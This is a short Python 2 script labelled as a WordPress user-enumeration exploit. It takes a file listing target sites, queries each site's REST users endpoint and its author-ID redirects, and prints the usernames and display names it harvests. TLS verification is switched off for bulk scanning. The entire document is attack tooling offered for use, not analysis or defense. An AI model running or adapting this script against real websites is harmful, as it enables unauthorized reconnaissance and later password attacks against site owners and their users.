## Wordpress User Enumeration
## Coded By Con7ext
## Exploit - Kita

import json, warnings, requests as r, sys
from multiprocessing.dummy import Pool as Tod
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

def wp_Enumerate(site):
  site = site.rstrip("/")
  daisuki = r.get(site + "/wp-json/wp/v2/users",  verify=False, timeout=15)
  if daisuki.status_code == 200:
    poek = daisuki.text.count("slug")
    js = json.loads(daisuki.text)
    print("[*] " + site)
    print("[*] Found %d User" % (poek))
    for i in js:
      print("[ID]   %d" % (i["id"]))
      print("[USER] %s" % (i["slug"]))
      print("[NAME] %s" % (i["name"]))
    print("")
  else:
    print("[*] "+ site)
    for i in range(0, 10):
      cog = r.get("%s/?author=%d" % (site, i), verify=False, timeout=15, allow_redirects=False)
      if cog.status_code == 301 and "Location" in cog.headers:
        #print("[USER] " + cog.url)
        print("[USER] " + cog.headers["location"])
      print("")
      
for site in open(sys.argv[1], "r").read().split("\n"):
  try:
    wp_Enumerate(site)
  except Exception, e:
    print("[ERROR] "+ site)
    
